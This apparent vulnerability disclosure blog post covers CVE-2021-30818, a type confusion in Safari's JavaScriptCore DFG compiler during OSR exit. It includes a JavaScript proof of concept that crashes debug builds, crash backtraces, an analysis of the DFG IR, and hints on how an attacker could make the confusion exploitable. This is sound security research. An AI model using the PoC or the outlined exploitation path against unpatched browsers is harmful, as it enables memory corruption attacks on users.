---
layout: post
title:  "CVE-2021-30818 - Type confusion when reconstructing arguments on DFG OSR Exit"
date:   2021-11-11 07:26:16 +0000
categories: jekyll update
---

# Build Details
```
Product: Safari/JavaScriptCore
Version: Safari 14.1 (15611.1.21.161.7, 15611)
Hardware: Mac(Intel) macOS 10.15.7

git-svn commit:

commit 243095f056a2f8591da746183197c922a5fc7266 (HEAD -> safari-611.1.21.161, safari-611.1.21.161-branch)
Author: repstein@apple.com <repstein@apple.com@268f45cc-cd09-0410-ab3c-d52691b4dbfc>
Date:   Fri Apr 30 04:44:29 2021 +0000

    Versioning.
    
    WebKit-7611.1.21.161.7
    
    git-svn-id: https://svn.webkit.org/repository/webkit/branches/safari-611.1.21.161-branch@276830 268f45cc-cd09-0410-ab3c-d52691b4dbfc
```

# Build Steps
```
./Tools/Scripts/build-webkit --jsc-only --debug
```

# POC

The following program was generated by modifying a POC for CVE-2019-8820. The program below crashes debug builds built from the WebKit branch 611.1.21.161.
```js
function main() {
const v12 = [1337,1337];
const v13 = [1337,v12,v12,0];
for (let v14 = 0; v14 < 1000; v14++) {
    function v15(v16,v17) {
        const v18 = v14 + 127;
        const v19 = String();
        const v20 = String.fromCharCode(v14,v14,v18);
        const v21 = v13.shift();
        function v22() {
            const v23 = arguments;
        }
        const v24 = Object();
        const v25 = {};
        const v26 = v22(v25,129);
        const v27 = [-903931.176976766,v20,null,null,-903931.176976766];
        function v30() {
        }
        const v31 = {ownKeys:v30};
        const v32 = {};
        
        // At this point DFG node D@288 will be created 
        // which fills the operand loc28
        const v33 = new Proxy(v32,v31);
        Function.__proto__ = v33;
        const v34 = v27.join();
        try {
            const v35 = Function();

            // In order to keep node D@288 alive,
            // and in turn loc28 alive we assign 
            // v35 to the prototype of Proxy
            Proxy.__proto__ = v35;
            for (let v37 = 0; v37 < 127; v37++) {
                const v38 = isFinite();
                const v39 = isFinite;
                function v40(v41,v42,v43) {
                }
                const v44 = 1337;
                const v45 = undefined;
                const v46 = "function(){}";
                function* v47(v48,v49,v50,v51,v52) {
                }
                const v53 = charAt;
                function v56(v57,v58,v59,v60,v61) {
                    const v62 = v36(v35,v37);
                }
                for (let v64 = 0; v64 >= 10000; v64++) {
                }
                const v65 = 10000;
                const v66 = v38[4];
            }
        } catch(v67) {
        }
    }
    const v68 = v15();
}
}
noDFG(main);
noFTL(main);
main();
```

# Steps to reproduce
```js
$ ./WebKitBuild/Debug/bin/jsc --useConcurrentJIT=false poc.js

ASSERTION FAILED: cell->inherits(cell->JSC::JSCell::vm(), std::remove_pointer<T>::type::info())
../../Source/JavaScriptCore/runtime/WriteBarrier.h(58) : void JSC::validateCell(T) [with T = JSC::JSFunction*]

bt
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff225d859 in __GI_abort () at abort.c:79
#2  0x00005555555d569c in CRASH_WITH_INFO(...) () at DerivedSources/ForwardingHeaders/wtf/Assertions.h:713
#3  0x00007ffff52de762 in JSC::validateCell<JSC::JSFunction*> (cell=0x7fffaefd4240) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:58
#4  0x00007ffff52dbf82 in JSC::WriteBarrierBase<JSC::JSFunction, WTF::RawPtrTraits<JSC::JSFunction> >::set (this=0x7fffaefb6618, vm=..., owner=0x7fffaefb6600, value=0x7fffaefd4240) at ../../Source/JavaScriptCore/runtime/WriteBarrierInlines.h:38
#5  0x00007ffff576742c in JSC::DirectArguments::setCallee (this=0x7fffaefb6600, vm=..., function=0x7fffaefd4240) at ../../Source/JavaScriptCore/runtime/DirectArguments.h:116
#6  0x00007ffff572fe9a in JSC::DFG::operationCreateDirectArgumentsDuringExit (vmPointer=0x7fffaf700000, inlineCallFrame=0x7fffef993e80, callee=0x7fffaefd4240, argumentCount=3) at ../../Source/JavaScriptCore/dfg/DFGOperations.cpp:2067
#7  0x00007fffef8facf5 in ?? ()
#8  0x00010000ffffffff in ?? ()
#9  0x0000000000000000 in ?? ()
```

# Analysis
This is a regression of the type confusion bug from CVE-2019-8820 that was first reported by Google P0 (https://bugs.chromium.org/p/project-zero/issues/detail?id=1924). This a fix was introduced as part of revision 250058 (https://bugs.webkit.org/show_bug.cgi?id=200715)(<rdar://problem/54301717>). However, this remediation did not fully address the issue and this POC illustrates that. 

In the POC above, the DFG compiles function v22 and isFinite and inlines them when the DFG compiles function v15. The relevant DFG IR snippets from the optimised graph generated for v15 are listed below:
```c++
     0   :   --> v22#CeT3Wk:<0x7fffaefc4390, bc#244, Call, closure call, numArgs+this = 3, numFixup = 0, stackOffset = -32 (loc0 maps to loc32)>

115  0   :    D@235:<!4:loc24>  PhantomDirectArguments(JS|MustGen|PureInt, DirectArguments, R:Stack,Stack(loc28),HeapObjectCount, W:HeapObjectCount, Exits, ClobbersExit, bc#7, ExitValid)
116  0   :    D@566:<!0:->      Phantom(Check:Untyped:D@58, MustGen, R:Stack(loc28), bc#7, ExitInvalid)
117  0   :    D@236:<!0:->      MovHint(Check:Untyped:D@235, MustGen, loc38, R:Stack(loc28), W:SideState, ClobbersExit, bc#7, ExitInvalid)

119  0   :    D@241:<!0:->      MovHint(Check:Untyped:D@235, MustGen, loc39, R:Stack(loc28), W:SideState, ClobbersExit, bc#12, ExitValid)
120  0   :    D@243:<!0:->      MovHint(Check:Untyped:D@235, MustGen, loc40, R:Stack(loc28), W:SideState, ClobbersExit, bc#15, ExitValid)

     0   :   <-- v22#CeT3Wk:<0x7fffaefc4390, bc#244, Call, closure call, numArgs+this = 3, numFixup = 0, stackOffset = -32 (loc0 maps to loc32)>


148  0   :  D@288:< 9:loc22>    JSConstant(JS|UseAsOther, OtherObj, Weak:Object: 0x7fffaefd4240 with butterfly 0x7fe0cf1fdee8 (Structure %AP:Proxy), StructureID: 23505, bc#295, ExitValid)

152  0   :  D@296:<!0:->        MovHint(Check:Untyped:D@288, MustGen, loc28, W:SideState, ClobbersExit, bc#309, ExitValid)
153  0   :  D@298:<!0:->        FilterCallLinkStatus(Check:Untyped:D@288, MustGen, Statically Proved, InternalFunction: Object: 0x7fffaefd4240 with butterfly 0x7fe0cf1fdee8 (Structure 0x7fffaef85ce0:[0x5bd1, Proxy, {length:100, name:101, revocable:102}, NonArray, Proto:0x7fffaef8e720, Leaf]), StructureID: 23505, W:SideState, bc#312, ExitValid)
154  0   :  D@299:<!2:loc19>    Construct(Check:Untyped:D@288, Check:Untyped:D@288, Check:Untyped:D@278, Check:Untyped:D@268, JS|MustGen|VarArgs|UseAsOther, ProxyObject, R:World, W:Heap, ExitsForExceptions, ClobbersExit, bc#312, ExitValid)  predicting ProxyObject



227  0   :  D@410:< 3:loc20>    NewFunction(KnownCell:D@364, JS|PureNum, Function, <0x7fffaefe5500, FunctionExecutable>, v56#<nogen>/<nogen>:[0x7fffaefe5500], R:HeapObjectCount, W:HeapObjectCount, ExitsForExceptions, bc#490, ExitValid)
228  0   :  D@712:<!0:->        Phantom(Check:Untyped:D@235, MustGen, bc#490, ExitValid)
232  0   :  D@416:< 6:loc20>    JSConstant(JS|UseAsOther, OtherObj, Weak:Object: 0x7fffaf5fa068 with butterfly 0x7fe0cf1e4408 (Structure %Bv:global), StructureID: 64314, bc#497, ExitValid)

     0   :   --> isFinite#DJEgRe:<0x7fffaefc7c90 (StrictMode), bc#512, Call, known callee: Object: 0x7fffaeff5c80 with butterfly (nil) (Structure %Bw:Function), StructureID: 39487, numArgs+this = 1, numFixup = 1, stackOffset = -46 (loc0 maps to loc46)>
237  0   :    D@429:< 11:loc22> JSConstant(JS|UseAsOther, Other, Undefined, bc#0, ExitInvalid)
238  0   :    D@430:<!0:->      MovHint(Check:Untyped:D@416, MustGen, loc40, W:SideState, ClobbersExit, bc#0, ExitInvalid)
239  0   :    D@431:<!0:->      MovHint(Check:Untyped:D@429, MustGen, loc39, W:SideState, ClobbersExit, bc#0, ExitInvalid)
240  0   :    D@432:<!0:->      ExitOK(MustGen, W:SideState, bc#0, ExitValid)
241  0   :    D@433:< 2:->      SetLocal(Check:Untyped:D@416, IsFlushed, loc40(GF~<Object>/FlushedJSValue), machine:loc16, W:Stack(loc40), bc#0, ExitValid)  predicting OtherObj
242  0   :    D@434:< 2:->      SetLocal(Check:Untyped:D@429, IsFlushed, loc39(HF~<Other>/FlushedJSValue), machine:loc15, W:Stack(loc39), bc#0, ExitValid)  predicting Other
```

The VarArgs Forwarding phase, converts the CreateDirectArguments node at D@235 to PhantomDirectArguments node. The Phantom Insertion phase, which runs after the VarArgs Forwarding phase, determines that loc40 is being kept alive by node D@243 and that loc40 is also being used at node D@433. Due to this the phase inserts a Phantom node D@712 to keep the children of node D@235 alive so that at OSR Exit from the DFG compiled code, the bytecode register values (e.g. loc40. loc39, etc) can be retrieved.

However, when OSR Exit does occur, and PhantomDirectArguments needs to be reconstructed the function operationCreateDirectArgumentsDuringExit is invoked. One of the parameters passed to this function is the value callee which is expected to be of the type JSFunction* and retrieved from the value stored in loc28. At the time of OSR Exit the value of loc28 is retrieved by referencing the node D@288 which points to the JSProxy object v33 in the POC: 
```js
const v33 = new Proxy(v32,v31);
Function.__proto__ = v33;
```
loc28 stores the memory address of the object v33 and this value is passed as the parameter callee to operationCreateDirectArgumentsDuringExit. When this reference is then stored into a WriteBarrier<JSFunction> during a call to setCallee, an assertion is raised in debug builds.

In order to exploit this type confusion, an attacker would have to suitably modify the POC to control the values that are retrieved from loc28 which then gets written into the memory location expecting a JSFunction pointer. If this value is then subsequently, accessed by user supplied code, the GC or other engine internals, it may lead to an exploitable condition. As an example, if the following line in the POC is commented out, it leads to node D@288 being killed and the value of loc28 being retrieved as jsUndefined which is the constant 0xa:
```js
//Proxy.__proto__ = v35;
```
The debug build would then hard crash when it attempts to de-reference the pointer value. The stack trace for this is shown below:
```js
Thread 1 "jsc" received signal SIGSEGV, Segmentation fault.
0x00005555555e9c62 in JSC::WeakSet::vm (this=0xffffffffffffffca) at ../../Source/JavaScriptCore/heap/WeakSet.h:84
84	    return *m_vm;

bt

#0  0x00005555555e9c62 in JSC::WeakSet::vm (this=0xffffffffffffffca) at ../../Source/JavaScriptCore/heap/WeakSet.h:84
#1  0x00005555555e9f8a in JSC::PreciseAllocation::vm (this=0xffffffffffffffa2) at ../../Source/JavaScriptCore/heap/PreciseAllocation.h:75
#2  0x00005555555f2f92 in JSC::HeapCell::vm (this=0xa) at ../../Source/JavaScriptCore/heap/HeapCellInlines.h:65
#3  0x00005555555f41e2 in JSC::JSCell::structure (this=0xa) at ../../Source/JavaScriptCore/runtime/JSCellInlines.h:136
#4  0x00007ffff52ddb92 in JSC::validateCell<JSC::JSFunction*> (cell=0xa) at ../../Source/JavaScriptCore/runtime/WriteBarrier.h:58
#5  0x00007ffff52db462 in JSC::WriteBarrierBase<JSC::JSFunction, WTF::RawPtrTraits<JSC::JSFunction> >::set (this=0x7fffaefb6618, vm=..., owner=0x7fffaefb6600, value=0xa) at ../../Source/JavaScriptCore/runtime/WriteBarrierInlines.h:38
#6  0x00007ffff5766906 in JSC::DirectArguments::setCallee (this=0x7fffaefb6600, vm=..., function=0xa) at ../../Source/JavaScriptCore/runtime/DirectArguments.h:116
#7  0x00007ffff572f374 in JSC::DFG::operationCreateDirectArgumentsDuringExit (vmPointer=0x7fffaf700000, inlineCallFrame=0x7fffef994cc0, callee=0xa, argumentCount=3) at ../../Source/JavaScriptCore/dfg/DFGOperations.cpp:2067
#8  0x00007fffaf905ea3 in ?? ()
```

# Apple Advisories

https://support.apple.com/en-ug/HT212816

https://support.apple.com/en-us/HT212869

https://support.apple.com/en-afri/HT212815